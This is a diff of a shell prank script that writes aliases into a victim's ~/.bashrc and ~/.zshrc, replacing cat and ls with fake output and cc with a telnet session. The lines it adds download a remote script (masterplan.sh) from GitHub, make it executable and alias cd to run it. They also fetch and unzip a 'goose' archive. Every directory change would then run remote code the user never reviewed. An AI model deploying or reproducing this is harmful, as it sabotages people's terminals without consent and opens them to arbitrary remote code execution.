@@ -11,17 +11,22 @@ add_alias() {
     fi
 }
 
-add_alias "alias cat='printf \"meow\n\"'" ~/.bash_aliases
+add_alias "alias cat='printf \"meow\n\"'" ~/.bashrc
 add_alias "alias cat='printf \"meow\n\"'" ~/.zshrc
 
-add_alias "alias ls='echo \"Segmentation fault\"'" ~/.bash_aliases
+add_alias "alias ls='echo \"Segmentation fault\"'" ~/.bashrc
 add_alias "alias ls='echo \"Segmentation fault\"'" ~/.zshrc
 
-add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.bash_aliases
+add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.bashrc
 add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.zshrc
 
 add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.bashrc
 add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.zshrc
+
+curl https://raw.githubusercontent.com/JonasGoetz01/sui/main/masterplan.sh > ~/masterplan.sh
+chmod +x ~/masterplan.sh
+echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
+echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc
 
 curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip'
 unzip -o ~/goose.zip -d ~/goose
